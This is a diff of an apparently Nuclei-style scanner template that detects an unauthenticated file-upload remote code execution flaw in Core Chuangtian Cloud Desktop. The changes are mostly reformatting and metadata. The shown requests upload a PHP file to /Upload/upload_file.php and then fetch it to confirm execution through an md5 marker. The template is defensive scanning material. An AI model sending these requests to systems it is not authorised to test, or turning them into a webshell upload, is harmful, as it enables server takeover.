@@ -1,5 +1,4 @@
 id: core-chuangtian-cloud-rce
-
 info:
   name: Core Chuangtian Cloud Desktop System - Remote Code Execution
   author: pikpikcu
@@ -10,16 +9,20 @@ info:
   classification:
     cvss-metrics: CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H
     cvss-score: 10
-    cwe-id: CWE-77
+    cwe-id: CWE-434,CWE-77
   metadata:
     runzero-review: REJECT/2025-11-07/excluding tag intrusive
     max-request: 2
-  tags: rce,fileupload,intrusive,cloud,chuangtian,vuln
+  tags: chuangtian,cloud,fileupload,intrusive,rce,vuln
 variables:
-  string: "core-chuangtian-cloud-rce"
-
+  string: core-chuangtian-cloud-rce
 http:
-  - raw:
+  - matchers:
+      - part: body_2
+        type: word
+        words:
+          - '{{md5(string)}}'
+    raw:
       - |
         POST /Upload/upload_file.php?l=test HTTP/1.1
         Host: {{Hostname}}
@@ -37,10 +40,3 @@ http:
       - |
         GET /Upload/test/{{randstr}}.php HTTP/1.1
         Host: {{Hostname}}
-
-    matchers:
-      - type: word
-        part: body_2
-        words:
-          - '{{md5(string)}}'
-
